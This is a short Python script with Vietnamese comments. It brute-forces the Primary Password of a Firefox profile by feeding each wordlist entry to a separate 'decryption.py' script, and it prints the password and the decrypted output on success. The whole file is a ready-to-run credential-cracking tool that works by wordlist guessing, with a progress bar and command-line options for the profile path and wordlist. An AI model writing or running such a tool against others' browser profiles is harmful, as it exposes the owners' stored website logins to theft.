import subprocess
import argparse
from tqdm import tqdm

# Load tất cả mật khẩu từ wordlist file
def load_wordlist(filepath):
    with open(filepath, "r", encoding="utf-8") as file:
        return file.read().splitlines()

# Thử giải mã với một password cụ thể
def try_password(profile_path, password):
    try:
        result = subprocess.run(
            ["python", "decryption.py", "-d", profile_path, "-p", password],  # Gọi script giải mã
            capture_output=True,
            text=True,
            timeout=10
        )
        return result.stdout.strip() + result.stderr.strip()  # Gộp stdout và stderr
    except Exception as e:
        return f"Error: {e}"

# Quét từng password trong wordlist để brute-force
def bruteforce(profile_path, passwords):    
    for password in tqdm(passwords, desc="Bruteforcing", ncols=77, leave=False, bar_format="{l_bar} {bar} | {n_fmt}/{total_fmt} [{elapsed} - {remaining}] | "):
        print(f"Trying: {password}", end="\r", flush=True)
        output = try_password(profile_path, password)
        if output and not output.startswith("Error"):
            print(f"\nSuccess! Primary Password is: {password}")
            print(output)
            return
    print("\nFail! No valid password found")

def main():
    parser = argparse.ArgumentParser(description="Brute-force Firefox Primary Password using decryption.py")
    parser.add_argument("-d", "--profile", required=True, help="Path to Firefox profile directory")
    parser.add_argument("-f", "--fuzzing", required=True, help="Path to wordlist file")
    args = parser.parse_args()

    try:
        passwords = load_wordlist(args.fuzzing)  # Load danh sách mật khẩu từ file
        bruteforce(args.profile, passwords)      # Bắt đầu brute-force
    except KeyboardInterrupt:
        print("\nBrute-force interrupted")

if __name__ == "__main__":
    main()